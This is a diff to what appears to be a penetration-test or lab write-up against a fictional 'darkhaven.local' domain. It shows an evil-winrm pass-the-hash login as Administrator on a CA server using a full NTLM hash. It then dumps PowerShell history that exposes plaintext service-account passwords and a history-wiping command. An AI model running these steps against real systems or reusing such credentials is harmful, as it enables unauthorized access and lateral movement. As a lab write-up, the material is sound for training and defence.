@@ -520,5 +520,30 @@ SMB         10.10.10.134    445    CA               [+] Added 5 SAM hashes to th
 
 ## Evil-winrm access as `Administrator` on `ca.ext.darkhaven.local`
 ```python
-
+evil-winrm -i ca.ext.darkhaven.local -u Administrator -H '7af69f428fd21312a225c74e5f574ed6'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
+I am now Administrator on the CA server
+
+# Powershell history leads to user compromise
+```python
+*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> type ConsoleHost_history.txt
+$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+$localLog = "C:\Temp\network_health_$timestamp.txt"
+$ping = Test-Connection -ComputerName $device.IP -Count 2 -Quiet`
+$tcp22 = Test-NetConnection -ComputerName $device.IP -Port 22 -InformationLevel Quiet`
+Write-Host "Health check complete. Preparing to upload log..."
+net use \\dc01\share /user:ldap_svc 6trfgvb**hs#@jskKFHJAh34
+net use \\dc01\share /delete
+echo "" > C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+net user "ca_svc_account$" "RTGHs82358sUFU*$%*&#jskj"
+```
+
